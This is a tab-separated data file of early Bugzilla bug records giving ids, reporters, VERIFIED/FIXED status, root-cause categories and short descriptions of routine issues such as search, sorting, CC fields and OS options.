Id%TAB%Opening%TAB%Reporter%TAB%VerificationStatus%TAB%ResolutionStatus%TAB%RootCauseCategory%TAB%Components%TAB%Description%TAB%FullDescription
538%TAB%904184243%TAB%3791%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%HTML Dialogs,UI,Bugzilla-General%TAB%Bugzilla can't search bug lists for a text match%TAB%Bugzilla can't search bug lists for a text match
539%TAB%904196016%TAB%3794%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%MIMELib,UI,Bugzilla-General%TAB%enter_bug.cgi chokes if we have multiple products.%TAB%enter_bug.cgi chokes if we have multiple products.
541%TAB%904216125%TAB%3794%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Sorting the initial query by "assignee" doesn't work.%TAB%Sorting the initial query by "assignee" doesn't work.
542%TAB%904243888%TAB%3794%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Whine at people when they have bugs that have been NEW for longer than a week.%TAB%Whine at people when they have bugs that have been NEW for longer than a week.
543%TAB%904247176%TAB%1069%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Bug list should not be titled "Mozilla bug list"%TAB%Bug list should not be titled "Mozilla bug list"
546%TAB%904247924%TAB%1069%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%Adding "CC" field does not work%TAB%Adding "CC" field does not work
548%TAB%904337598%TAB%1069%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Restore the "show my bugs" from the old Bugzilla%TAB%Restore the "show my bugs" from the old Bugzilla
553%TAB%904572270%TAB%3794%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Need better querying of assigned_to and reported_by fields.%TAB%Need better querying of assigned_to and reported_by fields.
555%TAB%904626784%TAB%3794%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Need a version-numbering scheme for bugzilla source.%TAB%Need a version-numbering scheme for bugzilla source.
734%TAB%905241741%TAB%3794%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Need to add system 8.x for macs.%TAB%Need to add system 8.x for macs.
818%TAB%905777973%TAB%3900%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%debugging output obfuscating query,Internet Explorer can't handle server-push pages.%TAB%debugging output obfuscating query,Internet Explorer can't handle server-push pages.
824%TAB%905852847%TAB%3915%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%password filter is too picky%TAB%password filter is too picky
827%TAB%905918007%TAB%3914%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%Crashed after adding comments to a bug.%TAB%Crashed after adding comments to a bug.
832%TAB%905979990%TAB%806%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Can't call method "prepare" without a package or object reference error%TAB%Can't call method "prepare" without a package or object reference error
842%TAB%906132436%TAB%3923%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%No MacOS 8 option in "OS" popup%TAB%No MacOS 8 option in "OS" popup
890%TAB%906634328%TAB%3953%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%buglist.cgi: apache changes boundary=ThisRandomString to boundary=thisrandomstring%TAB%buglist.cgi: apache changes boundary=ThisRandomString to boundary=thisrandomstring
1083%TAB%908194377%TAB%2147%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%password assignment mail had bad URL%TAB%password assignment mail had bad URL
